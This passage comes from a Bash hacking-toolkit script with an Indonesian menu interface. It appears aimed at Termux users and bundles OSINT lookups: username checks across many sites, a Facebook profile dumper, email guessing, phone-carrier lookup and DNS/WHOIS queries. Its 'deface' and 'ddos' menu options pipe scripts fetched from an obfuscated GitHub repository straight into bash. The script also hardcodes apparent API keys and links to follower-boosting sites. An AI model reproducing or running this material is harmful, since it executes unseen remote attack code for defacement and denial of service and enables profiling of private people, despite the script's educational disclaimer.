  echo -e "${WHT} Longitude       : ${GRN}$(echo "$data" | jq -r '.longitude')"
  lat=$(echo "$data" | jq -r '.latitude')
  lon=$(echo "$data" | jq -r '.longitude')
  echo -e "${WHT} Maps            : ${GRN}https://www.google.com/maps/@${lat},${lon},8z"
  echo -e "${WHT} EU              : ${GRN}$(echo "$data" | jq -r '.is_eu')"
  echo -e "${WHT} Postal          : ${GRN}$(echo "$data" | jq -r '.postal')"
  echo -e "${WHT} Calling Code    : ${GRN}$(echo "$data" | jq -r '.calling_code')"
  echo -e "${WHT} Capital         : ${GRN}$(echo "$data" | jq -r '.capital')"
  echo -e "${WHT} Borders         : ${GRN}$(echo "$data" | jq -r '.borders')"
  echo -e "${WHT} Country Flag    : ${GRN}$(echo "$data" | jq -r '.flag.emoji')"
  echo -e "${WHT} ASN             : ${GRN}$(echo "$data" | jq -r '.connection.asn')"
  echo -e "${WHT} ORG             : ${GRN}$(echo "$data" | jq -r '.connection.org')"
  echo -e "${WHT} ISP             : ${GRN}$(echo "$data" | jq -r '.connection.isp')"
  echo -e "${WHT} Domain          : ${GRN}$(echo "$data" | jq -r '.connection.domain')"
  echo -e "${WHT} Timezone ID     : ${GRN}$(echo "$data" | jq -r '.timezone.id')"
  echo -e "${WHT} ABBR            : ${GRN}$(echo "$data" | jq -r '.timezone.abbr')"
  echo -e "${WHT} DST             : ${GRN}$(echo "$data" | jq -r '.timezone.is_dst')"
  echo -e "${WHT} Offset          : ${GRN}$(echo "$data" | jq -r '.timezone.offset')"
  echo -e "${WHT} UTC             : ${GRN}$(echo "$data" | jq -r '.timezone.utc')"
  echo -e "${WHT} Current Time    : ${GRN}$(echo "$data" | jq -r '.timezone.current_time')"
}

ascii_art() {
  clear
  echo "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
  echo "│        Pilih Font ASCII                 │"
  echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"

  read -p "[ ? ] Teks: " TEXT
  [[ -z "$TEXT" ]] && return

  declare -A FONTS=(
    [1]="small"
    [2]="shadow"
    [3]="bubble"
    [4]="graffiti"
    [5]="big"
    [6]="script"
    [7]="smslant"
    [8]="standard"
    [9]="block"
    [10]="digital"
  )

  while true; do
    echo
    for i in "${!FONTS[@]}"; do
      printf "│ [%2d] %-15s │\n" "$i" "${FONTS[$i]}"
    done
    echo "│ [ 0] Kembali                                 │"
    echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    read -p "Pilih font: " CHOICE
    [[ "$CHOICE" == "0" ]] && break
    [[ -n "${FONTS[$CHOICE]}" ]] && {
      echo -e "\033[1;36m--- ${FONTS[$CHOICE]} ---\033[0m"
      figlet -f "${FONTS[$CHOICE]}" "$TEXT"
      echo
    } || echo "Nomor salah"
  done
}

deface_mod() {
  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/deface.sh")
}

ddos() {
  bash <(curl -sL "https://raw.githubusercontent.com/JSHDBNCIUAXJNIKUEABCIUWENICKU/OAJSNOIASAIUNSXIANUXAIIWQNQINS9WQNXIEN/refs/heads/main/1980.sh")
}

suntik_ig() {
clear
spasi
echo -e "

░██████╗██╗░░░██╗███╗░░██╗████████╗██╗██╗░░██╗
██╔════╝██║░░░██║████╗░██║╚══██╔══╝██║██║░██╔╝
╚█████╗░██║░░░██║██╔██╗██║░░░██║░░░██║█████═╝░
░╚═══██╗██║░░░██║██║╚████║░░░██║░░░██║██╔═██╗░
██████╔╝╚██████╔╝██║░╚███║░░░██║░░░██║██║░╚██╗
╚═════╝░░╚═════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝
░██████╗░██████╗░░█████╗░███╗░░░███╗
██╔════╝░██╔══██╗██╔══██╗████╗░████║
██║░░██╗░██████╔╝███████║██╔████╔██║
██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║
╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║
░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝" | lolcat -p 0.7
xdg-open "https://www.famety.net/free-instagram-followers"
}


banner_big() {
  clear
  cat << "EOF"
   ________               __      ______                __  
  / ____/ /_  ____  _____/ /_    /_  __/________ ______/ /__
 / / __/ __ \/ __ \/ ___/ __/_____/ / / ___/ __ `/ ___/ //_/
/ /_/ / / / / /_/ (__  ) /_/_____/ / / /  / /_/ / /__/ ,<   
\____/_/ /_/\____/____/\__/     /_/ /_/   \__,_/\___/_/|_| 

    [ + ]  C O D E   B Y  D A N X Y  [ + ]
EOF
}
menu_ghostrack() {
    pause(){ echo -e "\n\033[1;92m[i]\033[0m Press Enter to continue..."; read -r; }

    menu(){
        banner_big
        echo -e "
      \033[1;96m╔══════════════════════════════════════════════╗\033[0m
      \033[1;96m║\033[0m  \033[1;94m01\033[0m \033[1;97mUserrecon   \033[0m\033[1;92mUsername reconnaissance\033[0m      \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m02\033[0m \033[1;97mFacedumper  \033[0m\033[1;92mDump Facebook info\033[0m           \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m03\033[0m \033[1;97mMailfinder  \033[0m\033[1;92mFind e-mail from name\033[0m        \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m04\033[0m \033[1;97mGodorker    \033[0m\033[1;92mGoogle dorking\033[0m               \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m05\033[0m \033[1;97mPhoneinfo   \033[0m\033[1;92mPhone number info\033[0m            \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m06\033[0m \033[1;97mDNSLookup   \033[0m\033[1;92mDNS lookup\033[0m                   \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m07\033[0m \033[1;97mWhoislookup \033[0m\033[1;92mWhois lookup\033[0m                 \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m08\033[0m \033[1;97mSublookup   \033[0m\033[1;92mSubnet calculator\033[0m            \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m09\033[0m \033[1;97mHostfinder  \033[0m\033[1;92mFind hostnames\033[0m               \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m10\033[0m \033[1;97mDNSfinder   \033[0m\033[1;92mShared DNS finder\033[0m            \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m11\033[0m \033[1;97mRIPlookup   \033[0m\033[1;92mReverse IP lookup\033[0m            \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m12\033[0m \033[1;97mIPlocation  \033[0m\033[1;92mIP to location\033[0m               \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m13\033[0m \033[1;97mBitlyBypass \033[0m\033[1;92mExpand short URL\033[0m             \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m14\033[0m \033[1;97mGithubLookup\033[0m\033[1;92mGitHub user info\033[0m             \033[1;96m║\033[0m
      \033[1;96m║\033[0m  \033[1;94m15\033[0m \033[1;97mTempMail    \033[0m\033[1;92mDisposable mailbox\033[0m           \033[1;96m║\033[0m
      \033[1;96m╠══════════════════════════════════════════════╣\033[0m
      \033[1;96m║\033[0m  \033[1;91m00\033[0m \033[1;97mExit        \033[1;95mbye bye :(\033[0m                   \033[1;96m║\033[0m
      \033[1;96m╚══════════════════════════════════════════════╝\033[0m"
    }



# ---------- Functions ----------
userrecon() {
  local R="\033[31m" G="\033[32m" RESET="\033[0m"

  read -rp "Enter username : " user
  echo

  # ---- 60-site master list (cleaned) ----
  local sites=(
    https://facebook.com/{}
    https://instagram.com/{}
    https://twitter.com/{}
    https://youtube.com/{}
    https://vimeo.com/{}
    https://github.com/{}
    https://plus.google.com/{}
    https://pinterest.com/{}
    https://flickr.com/people/{}
    https://vk.com/{}
    https://about.me/{}
    https://disqus.com/{}
    https://bitbucket.org/{}
    https://flipboard.com/@{}
    https://medium.com/@{}
    https://hackerone.com/{}
    https://keybase.io/{}
    https://buzzfeed.com/{}
    https://slideshare.net/{}
    https://mixcloud.com/{}
    https://soundcloud.com/{}
    https://badoo.com/en/{}
    https://imgur.com/user/{}
    https://open.spotify.com/user/{}
    https://pastebin.com/u/{}
    https://wattpad.com/user/{}
    https://canva.com/{}
    https://codecademy.com/{}
    https://last.fm/user/{}
    https://blip.fm/{}
    https://dribbble.com/{}
    https://en.gravatar.com/{}
    https://foursquare.com/{}
    https://creativemarket.com/{}
    https://ello.co/{}
    https://cash.me/{}
    https://angel.co/{}
    https://500px.com/{}
    https://houzz.com/user/{}
    https://tripadvisor.com/members/{}
    https://kongregate.com/accounts/{}
    https://{}.blogspot.com
    https://{}.tumblr.com
    https://{}.wordpress.com
    https://{}.deviantart.com
    https://{}.slack.com
    https://{}.livejournal.com
    https://{}.newgrounds.com
    https://{}.hubpages.com
    https://{}.contently.com
    https://steamcommunity.com/id/{}
    https://www.wikipedia.org/wiki/User:{}
    https://www.freelancer.com/u/{}
    https://www.dailymotion.com/{}
    https://www.etsy.com/shop/{}
    https://www.scribd.com/{}
    https://www.patreon.com/{}
    https://www.behance.net/{}
    https://www.goodreads.com/{}
    https://www.gumroad.com/{}
    https://www.instructables.com/member/{}
    https://www.codementor.io/{}
    https://www.reverbnation.com/{}
    https://www.designspiration.net/{}
    https://www.bandcamp.com/{}
    https://www.colourlovers.com/love/{}
    https://www.ifttt.com/p/{}
    https://www.trakt.tv/users/{}
    https://www.okcupid.com/profile/{}
    https://www.trip.skyscanner.com/user/{}
    http://www.zone-h.org/archive/notifier={}
    https://tiktok.com/@{}
    https://linkedin.com/in/{}
  )

  for template in "${sites[@]}"; do
    local url="${template/\{\}/$user}"
    local status
    status=$(curl -s -L -o /dev/null -w "%{http_code}" --max-time 10 "$url")
    if [[ $status =~ ^2 ]]; then
      echo -e "${G}[+]${RESET} $url"
    else
      echo -e "${R}[-]${RESET} $url"
    fi
  done

  echo -e "\n${G}ENTER UNTIK KEMBALI KE MENU${RESET}"
  read -r _
}


API_HACKERTARGET="https://api.hackertarget.com/{}/?q={}"
IPINFO_API_URL="https://ipinfo.io/{}/json"
VERIPHONE_API_BASE_URL="https://api.veriphone.io/v2/verify"
REALEMAIL_API_URL="https://isitarealemail.com/api/email/validate"
GITHUB_API_URL="https://api.github.com/users/{}"
TEMPMAIL_API_URL="https://www.1secmail.com/api/v1/"
TEMPMAIL_MAILBOX_URL="https://www.1secmail.com/mailbox"

# Keys – export in your shell or change below
REALEMAIL_API_KEY="${REALEMAIL_API_CONFIG_KEY:-0c6ad1fd-f753-4628-8c0a-7968e722c6c7}"
VERIPHONE_API_KEY="${VERIPHONE_API_CONFIG_KEY:-INK824D4fh7FGY0v00QY9aUO1T75JCih}"

# -----------------------------------------------------------------------------
# 2. Generic helpers
# -----------------------------------------------------------------------------
require_jq() {
  if ! command -v jq &>/dev/null; then
    echo -e "${R}[!]${RESET} 'jq' is required but not installed." >&2
    return 1
  fi
}
pause() {
  echo -e "${G}Press ENTER to return to the menu…${RESET}"
  read -r _
}

# -----------------------------------------------------------------------------
# 3. Facebook UID dumper (graph)
# -----------------------------------------------------------------------------
facedumper() {
  require_jq || return
  read -rp "Facebook UID or username : " uid
  token="${FB_TOKEN:-}"
  [[ -z $token ]] && { echo -e "${R}[!]${RESET} export FB_TOKEN first"; return; }
  url="https://graph.facebook.com/${uid}?access_token=${token}&fields=id,name,username,birthday,email,gender,link"
  curl -s "$url" | jq .
  pause
}

# -----------------------------------------------------------------------------
# 4. E-mail permutation tester
# -----------------------------------------------------------------------------
mailfinder() {
  require_jq || return
  read -rp "Full name (First Last) : " name
  read -rp "Domain (gmail.com)    : " dom
  IFS=' ' read -r f l <<<"$name"
  for e in "${f}.${l}@${dom}" "${f}${l}@${dom}" "${f}@${dom}"; do
    res=$(curl -s "${REALEMAIL_API_URL}?email=${e}" \
               -H "Authorization: Bearer ${REALEMAIL_API_KEY}")
    [[ "$(jq -r '.status' <<<"$res")" == "valid" ]] && \
      echo -e "${G}[✓]${RESET} $e" | tee -a result_mailfinder.txt
  done
  pause
}

# -----------------------------------------------------------------------------
# 5. Google dorker (hackertarget)
# -----------------------------------------------------------------------------
godorker() {
  read -rp "Dork string : " dork
  enc=$(jq -sRr @uri <<<"$dork")
  url=$(printf "$API_HACKERTARGET" "google" "$enc")
  curl -s "$url" | tee result_godorker.txt
  pause
}

# -----------------------------------------------------------------------------
# 6. Phone-number lookup (veriphone)
# -----------------------------------------------------------------------------
phoneinfo() {
  require_jq || return
  read -rp "Phone (+628...) : " phone
  url="${VERIPHONE_API_BASE_URL}?phone=${phone}&key=${VERIPHONE_API_KEY}"
  curl -s "$url" | jq .
  pause
}

# -----------------------------------------------------------------------------
# 7. DNS / WHOIS / subnet / host / shared-dns helpers
#   – each uses the same hackertarget pattern
# -----------------------------------------------------------------------------
dnslookup() {
  read -rp "Domain : " dom
  curl -s "$(printf "$API_HACKERTARGET" "dnslookup" "$dom")"
  pause
}
whoislookup() {
  read -rp "Domain/IP : " dom
  curl -s "$(printf "$API_HACKERTARGET" "whois" "$dom")"
  pause
}
sublookup() {
  read -rp "Domain/IP : " dom
  curl -s "$(printf "$API_HACKERTARGET" "subnetcalc" "$dom")"
  pause
}
hostfinder() {
  read -rp "Domain : " dom
  curl -s "$(printf "$API_HACKERTARGET" "hostsearch" "$dom")"
  pause
}
dnsfinder() {
  read -rp "Domain : " dom
  curl -s "$(printf "$API_HACKERTARGET" "findshareddns" "$dom")"
  pause
}
riplookup() {
  read -rp "IP address : " ip
  curl -s "$(printf "$API_HACKERTARGET" "reverseiplookup" "$ip")"
  pause
}

# -----------------------------------------------------------------------------
# 8. ipinfo.io wrapper
# -----------------------------------------------------------------------------
iplocation() {
  require_jq || return
  read -rp "IP address : " ip
  curl -s "${IPINFO_API_URL/\{\}/$ip}" | jq .
  pause
}

# -----------------------------------------------------------------------------
# 9. Bitly expander (no API key needed)
# -----------------------------------------------------------------------------
bitlybypass() {
  read -rp "Short URL : " url
  long=$(curl -sI "$url" | grep -i '^location:' | cut -d' ' -f2 | tr -d '\r')
  [[ -n $long ]] && echo -e "${G}[✓]${RESET} $long" || echo -e "${R}[!]${RESET} No redirect"
  pause
}

# -----------------------------------------------------------------------------
# 10. GitHub user lookup
# -----------------------------------------------------------------------------
githublookup() {
  require_jq || return
  read -rp "GitHub username : " user
  curl -s "${GITHUB_API_URL/\{\}/$user}" | jq .
  pause
}

# -----------------------------------------------------------------------------
# 11. Disposable mailbox (1secmail)
# -----------------------------------------------------------------------------
tempmail() {
  require_jq || return
  login=$(LC_ALL=C tr -dc 'a-z0-9' </dev/urandom | head -c10)
  domain="1secmail.com"
  addr="$login@$domain"
  printf '\n\033[92m📧\033[0m Address : \033[93m%s\033[0m\n' "$addr"
  printf '\033[90mChecking inbox every 3 s (Ctrl-C to quit)…\033[0m\n'

  while true; do
    res=$(curl -s "${TEMPMAIL_API_URL}?action=getMessages&login=$login&domain=$domain")
    if [[ $(jq -r 'type' <<<"$res" 2>/dev/null) == "array" && $res != "[]" ]]; then
      jq -r '.[] | "From:  $.from)\nSubject:  $.subject)\n"' <<<"$res"
    fi
    sleep 3
  done
}

# ---- loop utama ----
while true; do
    menu
    read -rp "Select option : " opt
    case "$opt" in
        01|1) klik; userrecon ;;
        02|2) klik; facedumper ;;
        03|3) klik; mailfinder ;;
        04|4) klik; godorker ;;
        05|5) klik; phoneinfo ;;
        06|6) klik; dnslookup ;;
        07|7) klik; whoislookup ;;
        08|8) klik; sublookup ;;
        09|9) klik; hostfinder ;;
        10)   klik; dnsfinder ;;
        11)   klik; riplookup ;;
        12)   klik; iplocation ;;
        13)   klik; bitlybypass ;;
        14)   klik; githublookup ;;
        15)   klik; tempmail ;;
        00|0) echo -e "\n\033[1;91m[!]\033[0m Bye!"; break ;;
        *) salah;  echo -e "\033[1;91m[!]\033[0m Invalid choice"; sleep 1 ;;
    esac
    read -r dummy
done
}


validate_phone_number() {
  [[ "$1" =~ ^08[0-9]{8,11}$ ]] || {
    echo -e "${RED}[ ! ] Nomor telepon Harus 10-11 digit!${NC}"
    return 1
  }
  return 0
}

suntik_tiktok() {
clear
loading
clear
  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │           ${YELLOW}DANXY OFFICIAL 80${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
     echo -e "${RED}                                                     
@@@@@@@  @@@  @@@  @@@  @@@@@@@   @@@@@@   @@@  @@@  
@@@@@@@  @@@  @@@  @@@  @@@@@@@  @@@@@@@@  @@@  @@@  
  @@!    @@!  @@!  !@@    @@!    @@!  @@@  @@!  !@@  
  !@!    !@!  !@!  @!!    !@!    !@!  @!@  !@!  @!!  
  @!!    !!@  @!@@!@!     @!!    @!@  !@!  @!@@!@!   
  !!!    !!!  !!@!!!      !!!    !@!  !!!  !!@!!!    
  !!:    !!:  !!: :!!     !!:    !!:  !!!  !!: :!!   
  :!:    :!:  :!:  !:!    :!:    :!:  !:!  :!:  !:!  
  ::     ::   ::  :::     ::    ::::: ::   ::  :::  
  :     :       :   :::     :      : :  :   :   :::  
                                                     ${NC}" | lolcat -p 0.7
  xdg-open "https://zefoy.com/" &
}

cek_provider() {
  clear
  spasi
  echo -e "
┌─────────────────────────────────────────────────────────────┐
│██████╗░██████╗░░█████╗░██╗░░░██╗██╗██████╗░███████╗██████╗░ │
│██╔══██╗██╔══██╗██╔══██╗██║░░░██║██║██╔══██╗██╔════╝██╔══██╗ │
│██████╔╝██████╔╝██║░░██║╚██╗░██╔╝██║██║░░██║█████╗░░██████╔╝ │
│██╔═══╝░██╔══██╗██║░░██║░╚████╔╝░██║██║░░██║██╔══╝░░██╔══██╗ │
│██║░░░░░██║░░██║╚█████╔╝░░╚██╔╝░░██║██████╔╝███████╗██║░░██║ │
│╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝ │
└─────────────────────────────────────────────────────────────┘
│               DANXY TOOLS V8.4 FITUR PROVIDER               │
└─────────────────────────────────────────────────────────────┘
│ DEVELOPER DANXY OFFICIAL │
└──────────────────────────┘ " | lolcat -p 0.7
  read -p " MASUKAN NOMOR (08XXX): " nomor
  loading

  validate_phone_number "$nomor" || return 1

  API_KEY="INK824D4fh7FGY0v00QY9aUO1T75JCih"

  response=$(curl -s --fail \
    --url "https://api.apilayer.com/number_verification/validate?number=$nomor&country_code=ID" \
    --header "apikey: $API_KEY") || {
      echo -e "${RED}Gagal menghubungi API${NC}"
      return 1
  }

  # Ekstrak nilai yang diperlukan
  local_format=$(echo "$response" | jq -r '.local_format // "Tidak diketahui"')
  carrier=$(echo "$response" | jq -r '.carrier // "Tidak diketahui"')
  location=$(echo "$response" | jq -r '.location // ""')
  line_type=$(echo "$response" | jq -r '.line_type // "Tidak diketahui"')

  # Jika lokasi kosong, tampilkan "Tidak diketahui"
  [[ -z "$location" || "$location" == "null" ]] && location="Tidak diketahui"

  loading
  echo -e "${CYAN}
  ╭─────────────────────────────╮
  │   ${YELLOW}HASIL CEK PROVIDER${CYAN}        │
  ╰─────────────────────────────╯${NC}"

  echo -e "${GREEN}Nomor   : ${local_format}${NC}"
  echo -e "${GREEN}Provider: ${carrier}${NC}"
  echo -e "${GREEN}Lokasi  : ${location}${NC}"
  echo -e "${GREEN}Jenis   : ${line_type}${NC}"

  echo -e "${CYAN}
  ╭─────────────────────────────╮
  │   ${YELLOW}DANXY OFFICIAL 80${CYAN}         │
  ╰─────────────────────────────╯${NC}"
}



# Fungsi info tools
info() {
  clear
echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣄⣤⣤⣦⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⡗⠉⢹⣯⣿⡽⣷⣟⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠊⠁⠀⠀⠀⠑⠢⢄⠀⠀⠀⠀⠀⡖⡔⣆⢖⢔⢆⢖⢔⢆⢖⢔⢆⢖⢔⢆⢖⢔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⠿⠾⠽⠷⣻⣽⢿⡾⣷⡇⠀⠀⠀⠀⠀⠀⡠⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠤⡀⠀⡳⡹⡸⡜⣕⢝⡜⣕⢇⢇⢇⢇⢇⢇⢇⢏⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣔⣶⣶⣾⢶⣶⣶⣶⡷⣾⣽⣟⣿⣽⡇⢐⢐⠐⠠⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣮⠂⡪⣣⢳⠁⢀⠁⠈⠀⠁⠀⠁⠀⠁⠈⡎⡎⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡾⣟⣯⣷⢿⣻⣽⡷⣟⣿⣽⡾⣯⣷⣟⡇⢀⠢⠨⢈⢂⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⡽⣞⣷⣻⠄⢸⢜⢎⡂⠀⢢⡣⣣⢣⡒⡲⡰⡒⡜⡜⣜⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⡿⣯⣿⣻⡿⠝⠛⠛⠝⠚⠛⠫⠓⠋⡀⡂⠌⠌⡐⠄⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⣲⢯⢿⡽⣽⣻⣞⣾⠁⢸⢸⡱⠅⡀⢈⠨⠈⠈⠈⠈⠈⠈⢘⢜⢜⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣟⣿⢾⡻⠀⠄⠅⠅⡊⠌⠌⠌⡐⡁⡂⠔⠡⠨⠠⢑⡇⠀⠀⠀⠀⠀⠀⠀⠀⡷⡯⠏⡫⣟⣷⣳⣟⣾⠁⠨⡪⡎⡧⡰⡠⡢⡤⠥⠤⢤⠀⠀⢸⢸⢱⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠺⣯⢿⣻⡇⠈⢌⢐⢁⠂⠅⡊⡐⡐⡐⠠⠡⠡⠡⢁⠂⡇⠀⠀⠀⠀⠀⠀⠀⠀⡿⣭⢘⠹⣻⣞⣗⡷⣯⠃⠀⡏⡮⣒⠀⢀⠳⢭⠭⡹⡨⠀⠀⢕⢕⡳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠙⠉⠃⢈⠐⠄⡂⠅⡁⡀⠠⢀⢀⠁⠁⠁⠈⠀⠀⠘⠤⡀⠀⠀⠀⠀⠀⠀⡿⣝⠙⣼⣝⡮⣞⡯⠏⠀⠀⡣⡳⡱⣀⠠⠀⡀⠁⠀⠀⢀⢀⢇⢇⢗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⢁⠅⡂⠅⡂⠌⠌⠀⠂⠅⠀⠀⠀⠀⠀⠀⠀⠈⠑⠢⣀⠀⠀⠀⡿⣽⣻⣺⠳⠋⠁⠀⠀⠀⠀⢕⢝⢎⢮⢝⢕⢖⢕⢜⢜⢜⢜⢜⡜⡕⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠁⢂⠂⠅⡂⠅⡂⡂⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠄⡯⠗⠋⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠋⠪⠪⢣⢳⡱⡕⡕⠇⠏⠊⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⢠⣦⣴⣤⣄⠀⢤⣦⣴⣄⠀⢴⣴⣤⢰⣴⡤⣰⣴⣤⣦⣦⡦⣴⣤⣦⣴⣤⠀⢠⣦⣴⣤⣦⢀⣠⣦⣦⣄⠀⢀⣤⣦⣦⣀⢠⣦⣦⡄⠀⣠⣦⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⢈⣿⡧⢹⣿⡇⢰⣟⣿⣿⠀⢨⣿⣿⣧⣿⠅⠀⢻⣿⣾⡋⠀⠙⣿⣷⠟⠀⠀⠘⠫⣿⣏⠛⢸⣿⡇⢸⣿⣇⣿⣿⠀⣿⣿⠀⣿⣿⢀⡀⢿⣷⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⢰⣿⣷⣾⠿⠣⣾⣯⢽⣿⣧⢴⣿⡜⣿⣿⠅⣶⣿⡭⣿⣷⡆⠀⣾⣿⣇⠀⠀⠀⣸⣿⣷⡀⠘⢿⣧⣾⠿⠃⠻⣿⣦⡿⠟⢰⣿⣿⣾⣇⣷⣯⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
     " | lolcat -p 0.7
  loading
  clear
  echo -e "${RED}
  ╭────────────────────────────────────────╮
  │              ${BLUE}INFO TOOLS${RED}                │
  ╰────────────────────────────────────────╯
  ${NC}"

  echo -e "${GREEN}
Tools ini dikembangkan oleh DanxyOfficial
untuk tujuan edukasi dan eksplorasi teknologi.

[ ∅ ] ${BOLD}${RED}Tujuan Utama:${GREEN}
 - Mendorong pembelajaran seputar keamanan digital
 - Membantu pengguna memahami potensi celah sistem secara etis
 - Melatih keterampilan pencarian data terbuka (OSINT)
 - Menyediakan media belajar scripting & automasi di Termux

[ ∅ ] ${BOLD}${RED}Penggunaan Bertanggung Jawab:${GREEN}
   Tools ini hanya diperuntukkan untuk:
 - Edukasi & eksplorasi pribadi
 - Pengujian sistem milik sendiri (authorized testing)
 - Eksperimen dalam ruang lingkup legal

[ ∅ ] ${BOLD}${RED}Dilarang keras:${GREEN}
 - Menggunakan tools untuk tindak ilegal
   (peretasan, penipuan, penyalahgunaan data)
 - Melanggar privasi pihak lain tanpa izin
 - Menjual atau menyebarluaskan ulang tanpa izin dari pembuat
 - Menghapus atau mengubah nama pembuat (credit)

[ ∅ ] ${BOLD}${RED}Peringatan:${GREEN}
 Penyalahgunaan tools ini 
 dapat menimbulkan konsekuensi hukum.
 Jadilah pengguna yang bijak dan bertanggung jawab.

[ ∅ ] ${BOLD}${RED}Kontak & Support Resmi:${GREEN}
  - YouTube : ${YELLOW}https://www.youtube.com/@DanxyOfficial${GREEN}
